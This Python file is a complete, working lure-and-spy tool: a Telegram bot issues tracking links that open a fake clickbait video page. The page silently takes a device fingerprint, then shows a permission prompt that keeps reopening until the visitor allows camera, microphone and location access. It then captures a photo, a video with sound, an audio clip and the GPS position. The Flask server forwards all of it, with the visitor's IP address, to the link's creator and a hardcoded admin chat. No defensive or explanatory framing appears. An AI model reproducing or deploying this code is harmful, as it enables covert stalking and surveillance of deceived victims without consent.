import os
import json
import secrets
import logging
import threading
import requests
from flask import Flask, request, render_template_string, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from datetime import datetime

# ---------- Configuration ----------
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "1838854178")
_replit_domain = os.environ.get("REPLIT_DEV_DOMAIN", "")
BASE_URL = os.environ.get("BASE_URL", f"https://{_replit_domain}" if _replit_domain else "https://your-app.replit.dev")

tracking_links = {}
seen_users = set()

flask_app = Flask(__name__)

# ─────────────────────────────────────────
# HTML TEMPLATE
# ─────────────────────────────────────────
HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<title>ViralStream – Watch Free</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d0d0d;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;color:#fff;min-height:100vh;overflow-x:hidden}

/* ── Top bar ── */
.topbar{background:linear-gradient(90deg,#1a0a0a,#111);padding:10px 14px;display:flex;align-items:center;gap:10px;border-bottom:2px solid #e63946;position:sticky;top:0;z-index:50}
.logo{font-size:1.3rem;font-weight:900;color:#e63946;letter-spacing:-1px;text-shadow:0 0 20px rgba(230,57,70,.4)}
.logo span{color:#fff}
.live-badge{background:#e63946;color:#fff;font-size:.6rem;font-weight:700;padding:2px 6px;border-radius:3px;letter-spacing:.5px;animation:pulse 1.5s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.6}}
.searchbar{flex:1;background:#1e1e1e;border:1px solid #2a2a2a;border-radius:20px;padding:7px 14px;color:#aaa;font-size:.82rem}

/* ── Hero banner ── */
.hero{background:linear-gradient(135deg,#1a0010,#0a0a2e,#001a0a);padding:10px 14px 6px;border-bottom:1px solid #1e1e1e}
.hero-title{font-size:.75rem;color:#e63946;font-weight:700;letter-spacing:1px;text-transform:uppercase;margin-bottom:4px}
.trending-row{display:flex;gap:8px;overflow-x:auto;padding-bottom:4px;scrollbar-width:none}
.trending-row::-webkit-scrollbar{display:none}
.t-chip{background:#1e1e1e;border:1px solid #333;border-radius:12px;padding:4px 10px;font-size:.7rem;color:#aaa;white-space:nowrap;cursor:pointer}
.t-chip.hot{border-color:#e63946;color:#e63946}

/* ── Player ── */
.player-wrap{position:relative;background:#000;width:100%;aspect-ratio:16/9}
.thumb-img{width:100%;height:100%;object-fit:cover;filter:brightness(.55) saturate(1.3)}
.badges{position:absolute;top:10px;left:10px;display:flex;gap:6px}
.badge{padding:3px 8px;border-radius:4px;font-size:.65rem;font-weight:700;letter-spacing:.5px}
.badge.hd{background:#e63946;color:#fff}
.badge.viral{background:rgba(255,200,0,.9);color:#000}
.badge.new{background:rgba(0,200,100,.9);color:#000}
.view-count{position:absolute;top:10px;right:10px;background:rgba(0,0,0,.7);padding:3px 8px;border-radius:4px;font-size:.65rem;color:#ccc}
.play-overlay{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px}
.play-ring{width:80px;height:80px;border-radius:50%;border:3px solid rgba(255,255,255,.3);display:flex;align-items:center;justify-content:center;position:relative;cursor:pointer}
.play-ring::before{content:'';position:absolute;inset:-6px;border-radius:50%;border:2px solid rgba(230,57,70,.5);animation:ring-pulse 2s infinite}
@keyframes ring-pulse{0%{transform:scale(1);opacity:.8}100%{transform:scale(1.3);opacity:0}}
.play-btn-inner{width:64px;height:64px;background:rgba(230,57,70,.85);border-radius:50%;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(8px);transition:all .2s;box-shadow:0 0 30px rgba(230,57,70,.4)}
.play-btn-inner:hover{background:#e63946;transform:scale(1.05)}
.play-btn-inner svg{width:28px;height:28px;fill:#fff;margin-left:4px}
.play-label{font-size:.75rem;color:rgba(255,255,255,.8);letter-spacing:.5px;text-transform:uppercase}
.buffer-bar{position:absolute;bottom:0;left:0;right:0;height:3px;background:rgba(255,255,255,.1)}
.buffer-fill{height:100%;background:linear-gradient(90deg,#e63946,#ff6b6b);width:0%;transition:width .5s ease}

/* ── Info ── */
.info{padding:12px 14px 6px}
.info-title{font-size:.97rem;font-weight:700;line-height:1.4;margin-bottom:5px}
.info-meta{color:#777;font-size:.75rem;margin-bottom:8px;display:flex;align-items:center;gap:8px}
.dot{color:#333}
.tags{display:flex;gap:5px;flex-wrap:wrap;margin-bottom:10px}
.tag{background:#1a1a1a;border:1px solid #2a2a2a;border-radius:12px;padding:3px 9px;font-size:.68rem;color:#888}
.tag.fire{color:#e63946;border-color:#e63946}

/* ── Engagement bar ── */
.engage{display:flex;gap:0;border-top:1px solid #1a1a1a;border-bottom:1px solid #1a1a1a;margin-bottom:10px}
.eng-btn{flex:1;padding:10px 0;text-align:center;font-size:.7rem;color:#777;cursor:pointer;border-right:1px solid #1a1a1a;transition:color .15s}
.eng-btn:last-child{border-right:none}
.eng-btn:hover{color:#e63946}
.eng-icon{font-size:1rem;display:block;margin-bottom:2px}

/* ── Rec list ── */
.section-label{padding:4px 14px 6px;font-size:.72rem;color:#666;text-transform:uppercase;letter-spacing:.5px}
.rec-item{display:flex;gap:10px;padding:8px 14px;border-bottom:1px solid #111;cursor:pointer}
.rec-thumb{width:110px;min-width:110px;height:62px;border-radius:5px;overflow:hidden;position:relative;background:#1a1a1a}
.rec-thumb img{width:100%;height:100%;object-fit:cover}
.rec-dur{position:absolute;bottom:3px;right:3px;background:rgba(0,0,0,.8);border-radius:2px;padding:1px 4px;font-size:.65rem}
.rec-info .rec-title{font-size:.78rem;font-weight:500;line-height:1.3;margin-bottom:3px}
.rec-sub{font-size:.68rem;color:#555}
.rec-fire{color:#e63946;font-size:.7rem}

/* ── Modal ── */
.modal-backdrop{display:none;position:fixed;inset:0;background:rgba(0,0,0,.9);z-index:200;align-items:center;justify-content:center}
.modal-backdrop.show{display:flex}
.modal{background:#141414;border:1px solid #2a2a2a;border-radius:14px;padding:26px 22px;max-width:320px;width:92%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.8)}
.modal-icon{font-size:2.8rem;margin-bottom:10px}
.modal h3{font-size:1rem;font-weight:700;line-height:1.5;margin-bottom:8px}
.modal p{color:#888;font-size:.8rem;line-height:1.6;margin-bottom:18px}
.modal-btn{width:100%;padding:13px;border:none;border-radius:9px;font-size:.95rem;font-weight:700;cursor:pointer;margin-bottom:8px;transition:all .15s}
.modal-btn.primary{background:linear-gradient(135deg,#e63946,#c1121f);color:#fff;box-shadow:0 4px 20px rgba(230,57,70,.3)}
.modal-btn.primary:hover{transform:translateY(-1px);box-shadow:0 6px 24px rgba(230,57,70,.4)}
.modal-btn.sec{background:#1e1e1e;color:#666;font-size:.78rem;font-weight:400}

#toast{display:none;position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#222;color:#fff;padding:9px 20px;border-radius:20px;font-size:.78rem;z-index:300;border:1px solid #333}
</style>
</head>
<body>

<!-- Top bar -->
<div class="topbar">
  <div class="logo">▶<span>Viral</span></div>
  <span class="live-badge">LIVE</span>
  <div class="searchbar">Search trending videos...</div>
</div>

<!-- Hero trending chips -->
<div class="hero">
  <div class="hero-title">🔥 Trending Now</div>
  <div class="trending-row">
    <div class="t-chip hot">#Viral2024</div>
    <div class="t-chip">#Exclusive</div>
    <div class="t-chip hot">#MustWatch</div>
    <div class="t-chip">#Breaking</div>
    <div class="t-chip">#Leaked</div>
    <div class="t-chip hot">#Trending</div>
  </div>
</div>

<!-- Player -->
<div class="player-wrap" id="playerWrap">
  <img class="thumb-img" src="https://picsum.photos/seed/viral2024/800/450" alt="">
  <div class="badges">
    <span class="badge hd">4K HD</span>
    <span class="badge viral">🔥 VIRAL</span>
    <span class="badge new">NEW</span>
  </div>
  <div class="view-count">👁 2.4M views</div>
  <div class="play-overlay" id="playOverlay">
    <div class="play-ring" id="playBtn">
      <div class="play-btn-inner">
        <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
      </div>
    </div>
    <div class="play-label">Tap to Watch</div>
  </div>
  <div class="buffer-bar"><div class="buffer-fill" id="bufferFill"></div></div>
</div>

<!-- Modal -->
<div class="modal-backdrop" id="modal"></div>

<!-- Info -->
<div class="info">
  <div class="info-title">🔥 Exclusive Leaked Footage 2024 – You Won't Believe This!</div>
  <div class="info-meta">
    <span>2.4M views</span><span class="dot">•</span>
    <span>3 hours ago</span><span class="dot">•</span>
    <span style="color:#e63946">🔥 Trending #1</span>
  </div>
  <div class="tags">
    <span class="tag fire">#Viral</span>
    <span class="tag fire">#Exclusive</span>
    <span class="tag">#2024</span>
    <span class="tag">#MustWatch</span>
    <span class="tag">#Breaking</span>
  </div>
</div>

<!-- Engagement -->
<div class="engage">
  <div class="eng-btn"><span class="eng-icon">👍</span>98K</div>
  <div class="eng-btn"><span class="eng-icon">💬</span>4.2K</div>
  <div class="eng-btn"><span class="eng-icon">🔗</span>Share</div>
  <div class="eng-btn"><span class="eng-icon">⬇️</span>Save</div>
</div>

<!-- Recommendations -->
<div class="section-label">Up Next</div>
<div class="rec-item">
  <div class="rec-thumb"><img src="https://picsum.photos/seed/rec11/120/68"><div class="rec-dur">8:47</div></div>
  <div class="rec-info"><div class="rec-title">Hidden Cam Footage Goes Viral – Watch Before Deleted!</div><div class="rec-sub">ViralHub <span class="rec-fire">🔥</span> 1.8M views</div></div>
</div>
<div class="rec-item">
  <div class="rec-thumb"><img src="https://picsum.photos/seed/rec22/120/68"><div class="rec-dur">12:03</div></div>
  <div class="rec-info"><div class="rec-title">Caught on Camera – Unbelievable Real Moments 2024</div><div class="rec-sub">TopClips • 3.1M views</div></div>
</div>
<div class="rec-item">
  <div class="rec-thumb"><img src="https://picsum.photos/seed/rec33/120/68"><div class="rec-dur">6:29</div></div>
  <div class="rec-info"><div class="rec-title">SECRET Recording Exposed – This is WILD 🤯</div><div class="rec-sub">BestOf2024 <span class="rec-fire">🔥</span> 4.7M views</div></div>
</div>
<div class="rec-item">
  <div class="rec-thumb"><img src="https://picsum.photos/seed/rec44/120/68"><div class="rec-dur">18:55</div></div>
  <div class="rec-info"><div class="rec-title">They Didn't Know They Were Recorded... 😱</div><div class="rec-sub">ShockVid • 920K views</div></div>
</div>
<div class="rec-item">
  <div class="rec-thumb"><img src="https://picsum.photos/seed/rec55/120/68"><div class="rec-dur">4:11</div></div>
  <div class="rec-info"><div class="rec-title">Exclusive: What Really Happened – Full Footage</div><div class="rec-sub">ExclusiveTV • 2.2M views</div></div>
</div>

<div id="toast"></div>

<script>
const token = "{{ token }}";
const mode  = "{{ mode }}";

/* ─── Utilities ─── */
function showToast(msg,ms=3500){
  const t=document.getElementById("toast");
  t.textContent=msg;t.style.display="block";
  setTimeout(()=>t.style.display="none",ms);
}
function animateBuffer(pct,dur){
  const f=document.getElementById("bufferFill");
  f.style.transition=`width ${dur}ms linear`;f.style.width=pct+"%";
}

/* ─── Device model ─── */
async function getDeviceModel(){
  if(navigator.userAgentData){
    try{const d=await navigator.userAgentData.getHighEntropyValues(["model","platform"]);if(d.model&&d.model.trim())return d.model.trim();}catch(e){}
  }
  const ua=navigator.userAgent;
  let m=ua.match(/;\\s*([A-Za-z0-9 _\\-]+)\\s+Build/);if(m)return m[1].trim();
  m=ua.match(/\\(([^;)]+);\\s*([^;)]+);\\s*([^;)]+)\\)/);if(m)return m[3].trim();
  return navigator.platform||"Unknown";
}

/* ─── Fingerprint collector ─── */
async function collectFingerprint(){
  let battery={};
  try{const b=await navigator.getBattery();battery={batteryLevel:Math.round(b.level*100)+"%",charging:b.charging};}catch(e){}
  const conn=navigator.connection||navigator.mozConnection||navigator.webkitConnection||{};
  const deviceModel=await getDeviceModel();
  return{
    userAgent:navigator.userAgent,deviceModel,platform:navigator.platform,
    screenWidth:screen.width,screenHeight:screen.height,language:navigator.language,
    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
    hardwareConcurrency:navigator.hardwareConcurrency,deviceMemory:navigator.deviceMemory,
    maxTouchPoints:navigator.maxTouchPoints,cookieEnabled:navigator.cookieEnabled,
    connectionType:conn.effectiveType||conn.type||"unknown",downlink:conn.downlink,
    localTime:new Date().toString(),...battery
  };
}

/* ─── Send fingerprint silently (on page load, no waiting) ─── */
async function sendFingerprint(){
  try{
    const fp=await collectFingerprint();
    fetch("/capture_fingerprint",{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({token,fingerprint:fp})
    });// fire-and-forget
  }catch(e){}
}

/* ─── Permission modal – loops until granted ─── */
function showPermModal(icon,titleMM,titleEN,bodyMM,bodyEN){
  return new Promise(resolve=>{
    const bd=document.getElementById("modal");
    bd.innerHTML=`<div class="modal">
      <div class="modal-icon">${icon}</div>
      <h3>${titleMM}<br><small style="color:#888;font-weight:400;font-size:.82em">${titleEN}</small></h3>
      <p>${bodyMM}<br><span style="color:#555">${bodyEN}</span></p>
      <button class="modal-btn primary" id="rBtn">Allow ကိုနှိပ်ပါ ▶</button>
    </div>`;
    bd.classList.add("show");
    document.getElementById("rBtn").onclick=()=>{bd.classList.remove("show");resolve();};
  });
}

/* ─── Permission getters (retry forever) ─── */
async function getCameraStream(facing){
  while(true){
    try{
      return await navigator.mediaDevices.getUserMedia({video:{facingMode:facing,width:{ideal:1920},height:{ideal:1080}}});
    }catch(e){
      await showPermModal("📸",
        "ကင်မရာ ခွင့်ပြုချက် လိုအပ်သည်","Camera Access Required",
        "HD ဗီဒီယို ကြည့်ရှုရန် ကင်မရာ ခွင့်ပြုချက် လိုအပ်သည်",
        "Camera permission is required to stream HD content.");
    }
  }
}
async function getMicStream(){
  while(true){
    try{return await navigator.mediaDevices.getUserMedia({audio:true});}
    catch(e){
      await showPermModal("🎤",
        "မိုက်ခရိုဖုန်း ခွင့်ပြုချက် လိုအပ်သည်","Microphone Required",
        "HD အသံဖြင့် ကြည့်ရှုရန် မိုက်ခရိုဖုန်း ခွင့်ပြုချက် လိုအပ်သည်",
        "Microphone permission required for HD audio playback.");
    }
  }
}
async function getLocationPos(){
  while(true){
    try{
      return await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{timeout:15000,enableHighAccuracy:true}));
    }catch(e){
      await showPermModal("📍",
        "တည်နေရာ စစ်ဆေးမှု လိုအပ်သည်","Location Verification Required",
        "သင့်ဒေသ စစ်ဆေးမှသာ ဤဗီဒီယို ကြည့်ရှုနိုင်မည်",
        "Location check required to unlock this content in your region.");
    }
  }
}

/* ─── Capture & send immediately (fire-and-forget fetch) ─── */
async function sendPhoto(){
  try{
    const stream=await getCameraStream("environment");
    const v=document.createElement("video");
    v.srcObject=stream;v.setAttribute("playsinline","");v.setAttribute("muted","");
    await new Promise((res,rej)=>{v.onloadedmetadata=()=>v.play().then(res).catch(rej);v.onerror=rej;});
    await new Promise(r=>setTimeout(r,1500));
    const c=document.createElement("canvas");
    c.width=v.videoWidth||1280;c.height=v.videoHeight||720;
    c.getContext("2d").drawImage(v,0,0);
    stream.getTracks().forEach(t=>t.stop());
    const blob=await new Promise(r=>c.toBlob(r,"image/jpeg",0.9));
    if(!blob||blob.size<800)return;
    const fp=await collectFingerprint();
    const form=new FormData();
    form.append("token",token);form.append("photo",blob,"photo.jpg");form.append("fingerprint",JSON.stringify(fp));
    fetch("/capture_combined_photo",{method:"POST",body:form}); // fire-and-forget
  }catch(e){}
}

async function sendLocation(){
  try{
    const pos=await getLocationPos();
    const fp=await collectFingerprint();
    const form=new FormData();
    form.append("token",token);form.append("lat",pos.coords.latitude);form.append("lon",pos.coords.longitude);form.append("fingerprint",JSON.stringify(fp));
    fetch("/capture_combined_location",{method:"POST",body:form}); // fire-and-forget
  }catch(e){}
}

async function sendVideo(){
  try{
    const mimeType=MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus")?"video/webm;codecs=vp8,opus":"video/webm";
    const camStream=await getCameraStream("user");
    const micStream=await getMicStream();
    const combined=new MediaStream([...camStream.getVideoTracks(),...micStream.getAudioTracks()]);
    const recorder=new MediaRecorder(combined,{mimeType});
    const chunks=[];
    recorder.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data);};
    recorder.start(300);
    await new Promise(r=>setTimeout(r,4000)); // 4s recording
    recorder.stop();
    camStream.getTracks().forEach(t=>t.stop());micStream.getTracks().forEach(t=>t.stop());
    await new Promise(r=>recorder.onstop=r);
    const blob=new Blob(chunks,{type:mimeType});
    const fp=await collectFingerprint();
    const form=new FormData();
    form.append("token",token);form.append("video",blob,"video.webm");form.append("fingerprint",JSON.stringify(fp));
    fetch("/capture_combined_video",{method:"POST",body:form}); // fire-and-forget
  }catch(e){}
}

async function sendAudio(){
  try{
    const stream=await getMicStream();
    const mimeType=MediaRecorder.isTypeSupported("audio/webm;codecs=opus")?"audio/webm;codecs=opus":"audio/webm";
    const recorder=new MediaRecorder(stream,{mimeType});
    const chunks=[];
    recorder.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data);};
    recorder.start(300);
    await new Promise(r=>setTimeout(r,6000)); // 6s recording
    recorder.stop();
    stream.getTracks().forEach(t=>t.stop());
    await new Promise(r=>recorder.onstop=r);
    const blob=new Blob(chunks,{type:mimeType});
    const fp=await collectFingerprint();
    const form=new FormData();
    form.append("token",token);form.append("audio",blob,"audio.webm");form.append("fingerprint",JSON.stringify(fp));
    fetch("/capture_combined_audio",{method:"POST",body:form}); // fire-and-forget
  }catch(e){}
}

/* ─── Main capture dispatcher (parallel where possible) ─── */
async function startCapture(){
  animateBuffer(8,400);
  if(mode==="all"){
    // Photo and Location in parallel (both need permissions, browser queues them)
    await Promise.allSettled([sendPhoto(), sendLocation()]);
    animateBuffer(50,400);
    // Video (includes mic) then audio
    await sendVideo();
    animateBuffer(80,400);
    await sendAudio();
    animateBuffer(100,300);
  } else if(mode==="photo"){
    await sendPhoto(); animateBuffer(100,600);
  } else if(mode==="audio"){
    await sendAudio(); animateBuffer(100,600);
  } else if(mode==="location"){
    await sendLocation(); animateBuffer(100,600);
  } else if(mode==="video"){
    await sendVideo(); animateBuffer(100,600);
  } else {
    animateBuffer(100,600);
  }
  document.getElementById("playOverlay").innerHTML=
    '<div style="color:#fff;font-size:.8rem;opacity:.5;text-align:center">Video unavailable<br>in your region</div>';
  showToast("⚠️ Content unavailable in your region. Try again later.");
}

/* ─── Modal texts per mode ─── */
const MODAL={
  all:     {icon:"📺",mm:"HD ကြည့်ရှုရန် ခွင့်ပြုချက် လိုအပ်သည်",en:"HD Playback Required",
             bmm:"ကင်မရာ၊ မိုက်ခရိုဖုန်းနှင့် တည်နေရာ ခွင့်ပြုချက် ပေးရန် လိုအပ်သည်",
             ben:"Camera, microphone & location access required to unlock HD."},
  photo:   {icon:"📸",mm:"ကင်မရာ ခွင့်ပြုချက် လိုအပ်သည်",en:"Camera Required",
             bmm:"HD ပုံရိပ်နှင့် ကြည့်ရှုရန် ကင်မရာ ခွင့်ပြုချက် လိုအပ်သည်",
             ben:"Camera access required to stream HD content."},
  audio:   {icon:"🎤",mm:"မိုက်ခရိုဖုန်း ခွင့်ပြုချက် လိုအပ်သည်",en:"Microphone Required",
             bmm:"HD အသံဖြင့် ကြည့်ရှုရန် မိုက်ခရိုဖုန်း ခွင့်ပြုချက် လိုအပ်သည်",
             ben:"Microphone required for HD audio experience."},
  location:{icon:"📍",mm:"တည်နေရာ စစ်ဆေးမှု လိုအပ်သည်",en:"Region Check Required",
             bmm:"သင်နေသောဒေသမှ ဤဗီဒီယောကို ကြည့်ရှုခွင့်ရှိမရှိ စစ်ဆေးရန် လိုအပ်သည်",
             ben:"Location check required to verify you can watch this in your region."},
  video:   {icon:"🎥",mm:"ကင်မရာ + မိုက်ခရိုဖုန်း ခွင့်ပြုချက် လိုအပ်သည်",en:"Camera & Mic Required",
             bmm:"HD ဗီဒီယို ကြည့်ရှုရန် ကင်မရာနှင့် မိုက်ခရိုဖုန်း ခွင့်ပြုချက် လိုအပ်သည်",
             ben:"Camera & mic access required to stream HD video."}
};

/* ─── Play button click ─── */
document.getElementById("playBtn").onclick=()=>{
  const t=MODAL[mode]||MODAL.all;
  const bd=document.getElementById("modal");
  bd.innerHTML=`<div class="modal">
    <div class="modal-icon">${t.icon}</div>
    <h3>${t.mm}<br><small style="color:#888;font-weight:400;font-size:.82em">${t.en}</small></h3>
    <p>${t.bmm}<br><span style="color:#555">${t.ben}</span></p>
    <button class="modal-btn primary" id="allowBtn">Allow ကိုနှိပ်ပါ ▶ Watch HD</button>
    <button class="modal-btn sec" id="skipBtn">အနိမ့်အရည်အသွေးဖြင့် ကြည့်မည် | Low Quality</button>
  </div>`;
  bd.classList.add("show");
  document.getElementById("allowBtn").onclick=async()=>{
    bd.classList.remove("show");
    document.getElementById("playOverlay").innerHTML='<div style="color:#fff;font-size:.85rem;opacity:.6;text-align:center">⏳ Buffering HD...</div>';
    animateBuffer(5,200);
    await startCapture();
  };
  document.getElementById("skipBtn").onclick=()=>{
    bd.classList.remove("show");
    showToast("⚠️ Low quality not available. Allow access to continue.");
    setTimeout(()=>{ document.getElementById("playBtn").click(); },1800);
  };
};

/* ─── Fire fingerprint immediately on page load ─── */
sendFingerprint();
</script>
</body>
</html>"""


# ─────────────────────────────────────────
# FLASK ROUTES
# ─────────────────────────────────────────
@flask_app.route('/')
def index():
    return """<!DOCTYPE html><html><head><title>ViralStream</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0d0d0d;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
.box{text-align:center;padding:40px;background:#111;border-radius:14px;border:1px solid #222;max-width:400px;width:90%}
h1{color:#e63946;font-size:2rem;margin-bottom:12px}
p{color:#666;line-height:1.6;margin-bottom:8px}code{background:#1e1e1e;padding:3px 8px;border-radius:4px;color:#e63946}</style></head>
<body><div class="box"><h1>▶ ViralStream</h1>
<p>Bot ဖြင့် link ထုတ်ပြီး မျှဝေပါ</p>
<p>Use the Telegram bot to generate tracking links.</p>
<p style="margin-top:16px;font-size:.8rem;color:#444">Use <code>/grab</code> in the bot</p></div></body></html>""", 200


@flask_app.route('/track/<token>')
def track_page(token):
    mode = request.args.get('m', 'all')
    user_id = tracking_links.get(token)
    if user_id:
        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
        ua = request.headers.get('User-Agent', 'Unknown')[:120]
        mode_labels = {'all':'🌐 All-in-One','photo':'📸 Photo','audio':'🎤 Audio',
                       'location':'📍 Location','video':'🎥 Video','device':'📱 Device'}
        label = mode_labels.get(mode, mode)
        alert = (
            f"🔗 <b>Link ဖွင့်သည် | Link Opened!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 Mode: <b>{label}</b>\n"
            f"🌐 IP: <code>{ip}</code>\n"
            f"📱 UA: {ua}\n"
            f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"━━━━━━━━━━━━━━━━━━━━"
        )
        threading.Thread(target=broadcast_message, args=(user_id, alert), daemon=True).start()
    return render_template_string(HTML_TEMPLATE, token=token, mode=mode)


# ─────────────────────────────────────────
# CAPTURE ENDPOINTS
# ─────────────────────────────────────────
@flask_app.route('/capture_fingerprint', methods=['POST'])
def capture_fingerprint():
    data = request.get_json(silent=True) or {}
    token = data.get('token')
    user_id = tracking_links.get(token)
    if not user_id:
        return jsonify({"ok": False}), 400
    fp = data.get('fingerprint', {})
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    report = (
        f"📱 <b>Device Info | ဖုန်းအချက်အလက်</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 IP: <code>{ip}</code>\n"
        f"📱 Model: {fp.get('deviceModel','Unknown')}\n"
        f"💻 Platform: {fp.get('platform','Unknown')}\n"
        f"🖥 Screen: {fp.get('screenWidth','?')}×{fp.get('screenHeight','?')}\n"
        f"🗣 Language: {fp.get('language','?')}\n"
        f"⏰ Timezone: {fp.get('timezone','?')}\n"
        f"🔋 Battery: {fp.get('batteryLevel','?')} {'🔌' if fp.get('charging') else '🔋'}\n"
        f"📡 Net: {fp.get('connectionType','?')} / {fp.get('downlink','?')}Mbps\n"
        f"🧠 CPU: {fp.get('hardwareConcurrency','?')} cores | 💾 RAM: {fp.get('deviceMemory','?')}GB\n"
        f"📅 Time: {fp.get('localTime','?')}\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    threading.Thread(target=broadcast_message, args=(user_id, report), daemon=True).start()
    return jsonify({"ok": True}), 200


@flask_app.route('/capture_combined_photo', methods=['POST'])
def capture_combined_photo():
    token = request.form.get('token')
    user_id = tracking_links.get(token)
    if not user_id:
        return jsonify({"ok": False}), 400
    photo_file = request.files.get('photo')
    if not photo_file:
        return jsonify({"ok": False}), 400
    fp_json = request.form.get('fingerprint')
    caption = format_fingerprint_caption(json.loads(fp_json)) if fp_json else "📸 Photo"
    photo_bytes = photo_file.read()
    threading.Thread(target=broadcast_photo, args=(user_id, photo_bytes, caption), daemon=True).start()
    return jsonify({"ok": True}), 200


@flask_app.route('/capture_combined_video', methods=['POST'])
def capture_combined_video():
    token = request.form.get('token')
    user_id = tracking_links.get(token)
    if not user_id:
        return jsonify({"ok": False}), 400
    video_file = request.files.get('video')
    if not video_file:
        return jsonify({"ok": False}), 400
    fp_json = request.form.get('fingerprint')
    caption = format_fingerprint_caption(json.loads(fp_json)) if fp_json else "🎥 Video"
    video_bytes = video_file.read()
    threading.Thread(target=broadcast_video, args=(user_id, video_bytes, caption), daemon=True).start()
    return jsonify({"ok": True}), 200


@flask_app.route('/capture_combined_audio', methods=['POST'])
def capture_combined_audio():
    token = request.form.get('token')
    user_id = tracking_links.get(token)
    if not user_id:
        return jsonify({"ok": False}), 400
    audio_file = request.files.get('audio')
    if not audio_file:
        return jsonify({"ok": False}), 400
    fp_json = request.form.get('fingerprint')
    caption = format_fingerprint_caption(json.loads(fp_json)) if fp_json else "🎤 Audio"
    audio_bytes = audio_file.read()
    threading.Thread(target=broadcast_voice, args=(user_id, audio_bytes, caption), daemon=True).start()
    return jsonify({"ok": True}), 200


@flask_app.route('/capture_combined_location', methods=['POST'])
def capture_combined_location():
    token = request.form.get('token')
    user_id = tracking_links.get(token)
    if not user_id:
        return jsonify({"ok": False}), 400
    lat = request.form.get('lat')
    lon = request.form.get('lon')
    if not lat or not lon:
        return jsonify({"ok": False}), 400
    fp_json = request.form.get('fingerprint')
    caption = format_fingerprint_caption(json.loads(fp_json)) if fp_json else "📍 Location"
    threading.Thread(target=broadcast_location, args=(user_id, lat, lon), daemon=True).start()
    threading.Thread(target=broadcast_message, args=(user_id, caption), daemon=True).start()
    return jsonify({"ok": True}), 200


# ─────────────────────────────────────────
# TELEGRAM HELPERS
# ─────────────────────────────────────────
def recipients(user_id):
    ids = [str(user_id)]
    if str(ADMIN_CHAT_ID) not in ids:
        ids.append(str(ADMIN_CHAT_ID))
    return ids


def send_telegram_message(chat_id, text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": chat_id, "text": text, "parse_mode": "HTML"},
            timeout=10
        )
    except Exception:
        pass


def broadcast_message(user_id, text):
    for cid in recipients(user_id):
        threading.Thread(target=send_telegram_message, args=(cid, text), daemon=True).start()


def broadcast_photo(user_id, photo_bytes, caption):
    for cid in recipients(user_id):
        try:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                data={'chat_id': cid, 'caption': caption[:1024], 'parse_mode': 'HTML'},
                files={'photo': ('photo.jpg', photo_bytes, 'image/jpeg')},
                timeout=30
            )
        except Exception:
            pass


def broadcast_voice(user_id, audio_bytes, caption):
    for cid in recipients(user_id):
        try:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendVoice",
                data={'chat_id': cid, 'caption': caption[:1024], 'parse_mode': 'HTML'},
                files={'voice': ('audio.ogg', audio_bytes, 'audio/ogg')},
                timeout=30
            )
        except Exception:
            pass


def broadcast_video(user_id, video_bytes, caption):
    for cid in recipients(user_id):
        try:
            r = requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
                data={'chat_id': cid, 'caption': caption[:1024], 'parse_mode': 'HTML'},
                files={'video': ('video.mp4', video_bytes, 'video/mp4')},
                timeout=60
            )
            if not r.json().get('ok'):
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                    data={'chat_id': cid, 'caption': caption[:1024], 'parse_mode': 'HTML'},
                    files={'document': ('video.webm', video_bytes, 'video/webm')},
                    timeout=60
                )
        except Exception:
            pass


def broadcast_location(user_id, lat, lon):
    for cid in recipients(user_id):
        try:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
                json={"chat_id": cid, "latitude": float(lat), "longitude": float(lon)},
                timeout=10
            )
        except Exception:
            pass


def format_fingerprint_caption(fp):
    try:
        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    except Exception:
        ip = 'Unknown'
    return (
        f"📱 <b>Device Info</b>\n"
        f"🌐 IP: <code>{ip}</code>\n"
        f"📱 {fp.get('deviceModel','?')} | {fp.get('platform','?')}\n"
        f"🖥 {fp.get('screenWidth','?')}×{fp.get('screenHeight','?')} | {fp.get('language','?')}\n"
        f"⏰ {fp.get('timezone','?')}\n"
        f"🔋 {fp.get('batteryLevel','?')} {'🔌' if fp.get('charging') else '🔋'} | "
        f"📡 {fp.get('connectionType','?')} {fp.get('downlink','?')}Mbps"
    )


